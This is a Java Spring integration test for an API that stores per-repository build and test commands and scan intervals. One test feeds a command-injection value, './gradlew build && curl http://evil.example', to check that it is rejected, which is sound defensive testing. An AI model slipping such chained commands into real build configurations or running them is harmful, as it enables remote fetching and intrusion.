package com.ossagent.repository.adapter.in.web;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.patch;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.ossagent.repository.adapter.out.persistence.OssRepositoryRepository;
import com.ossagent.repository.adapter.out.persistence.RepositoryPolicyRepository;
import com.ossagent.repository.domain.OssRepository;
import com.ossagent.repository.domain.RepositoryPolicy;
import com.ossagent.repository.domain.RuleReading;
import com.ossagent.repository.domain.ScrubbedRules;
import com.ossagent.support.testing.AgentIntegrationTest;
import java.time.Clock;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayNameGeneration;
import org.junit.jupiter.api.DisplayNameGenerator;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;

/**
 * 빌드·테스트 명령 수동 설정(#102)과 저장소별 스캔 주기(#108) 의 HTTP 표면.
 */
@AgentIntegrationTest
@AutoConfigureMockMvc
@DisplayNameGeneration(DisplayNameGenerator.ReplaceUnderscores.class)
class PolicyCommandsApiTest {

    private static final String COMMANDS = "/api/repositories/%d/policy/commands";
    private static final String INTERVAL = "/api/repositories/%d/scan-interval";

    @Autowired
    private MockMvc mockMvc;
    @Autowired
    private OssRepositoryRepository repositories;
    @Autowired
    private RepositoryPolicyRepository policies;
    @Autowired
    private Clock clock;

    private Long repositoryId;

    @BeforeEach
    void setUp() {
        policies.deleteAll();
        String name = "spring-kafka-" + System.nanoTime();
        repositoryId = repositories.save(new OssRepository(
                "spring-projects", name, "https://github.com/spring-projects/" + name)).getId();
    }

    private void givenAnalyzedWithoutCommands() {
        policies.save(RepositoryPolicy.analyzed(
                repositories.findById(repositoryId).orElseThrow(),
                new RuleReading(true, null, null, null, false, false, false, ScrubbedRules.of("{}")),
                clock));
    }

    @Test
    void 명령을_넣으면_정책에_저장되고_응답은_명령을_에코하지_않는다() throws Exception {
        givenAnalyzedWithoutCommands();

        mockMvc.perform(post(COMMANDS.formatted(repositoryId))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"javaVersion\":\"21\",\"buildCommand\":\"./gradlew compileJava\","
                                + "\"testCommand\":\"./gradlew test\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.repositoryId").value(repositoryId))
                .andExpect(jsonPath("$.overriddenAt").isNotEmpty())
                .andExpect(jsonPath("$.buildCommand").doesNotExist());

        RepositoryPolicy policy = policies.findByRepositoryId(repositoryId).orElseThrow();
        assertThat(policy.getBuildCommand()).isEqualTo("./gradlew compileJava");
        assertThat(policy.getTestCommand()).isEqualTo("./gradlew test");
        assertThat(policy.getJavaVersion()).isEqualTo("21");
    }

    @Test
    void 쉘_메타문자가_든_명령은_422_다_S3() throws Exception {
        givenAnalyzedWithoutCommands();

        mockMvc.perform(post(COMMANDS.formatted(repositoryId))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"buildCommand\":\"./gradlew build && curl http://evil.example\"}"))
                .andExpect(status().isUnprocessableEntity());

        assertThat(policies.findByRepositoryId(repositoryId).orElseThrow().getBuildCommand())
                .as("거부된 명령이 저장되지 않는다")
                .isNull();
    }

    @Test
    void 정책_행이_없으면_404_다_S5() throws Exception {
        mockMvc.perform(post(COMMANDS.formatted(repositoryId))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"buildCommand\":\"./gradlew compileJava\"}"))
                .andExpect(status().isNotFound());
    }

    @Test
    void 스캔_주기를_설정하고_되돌린다() throws Exception {
        mockMvc.perform(patch(INTERVAL.formatted(repositoryId))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"minutes\":30}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.scanIntervalMinutes").value(30));

        mockMvc.perform(patch(INTERVAL.formatted(repositoryId))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.scanIntervalMinutes").doesNotExist());
    }

    @Test
    void 주기_0은_400_이다() throws Exception {
        mockMvc.perform(patch(INTERVAL.formatted(repositoryId))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"minutes\":0}"))
                .andExpect(status().isBadRequest());
    }
}
